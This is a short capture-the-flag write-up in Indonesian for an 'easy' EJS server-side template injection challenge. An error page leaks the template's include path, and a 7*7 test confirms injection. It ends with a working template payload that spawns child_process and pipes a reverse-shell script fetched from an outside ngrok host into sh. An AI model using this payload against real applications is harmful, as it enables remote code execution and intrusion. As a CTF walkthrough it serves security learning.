# Catalog (easy)

## ejs server side template injection


diberikan halaman index bertulisan "Welcome to templating using EJS", terdapat juga nav link "Upload your cat!" dan "Flag". link flag hanya memberikan 403 Forbidden, lalu saya coba untuk upload sebuah gambar dan juga harus mengisi notes.
Jika file terupload maka akan redirect ke host/cat/<id>
```html
<p>Found. Redirecting to <a href="cat/93722f7774449ad03306fceb68c9c439">cat/93722f7774449ad03306fceb68c9c439</a></p>
```

lalu saya coba untuk input id dengan random string pada /cat/<id>
https://catalog.mctf.ru/cat/randomstring, mendapati error

```html
Error: /app/views/cat.ejs:21
    19|         </div>
    20|         <div>
 >> 21|             <%- include('descriptions/' + description) %>
    22|         </div>
    23|     </div>
    24| </main>

Could not find the include file "descriptions/asd"
    at getIncludePath (/app/node_modules/ejs/lib/ejs.js:185:13)
    at includeFile (/app/node_modules/ejs/lib/ejs.js:311:19)
    at include (/app/node_modules/ejs/lib/ejs.js:701:16)
    at eval ("/app/views/cat.ejs":24:17)
    at cat (/app/node_modules/ejs/lib/ejs.js:703:17)
    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:274:36)
    at exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:491:10)
    at View.render (/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/app/node_modules/express/lib/application.js:609:3)
```

mengetahui ejs menggunakan <%- %>, saya coba untuk perkalian untuk test ssti `<%= 7*7 %>` dan itu berhasil menjadi 49.

langsung saja reverse shell 
```javascript
<%= function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl https://reverse-shell.sh/0.tcp.ap.ngrok.io:13282 | sh')}() %>
```
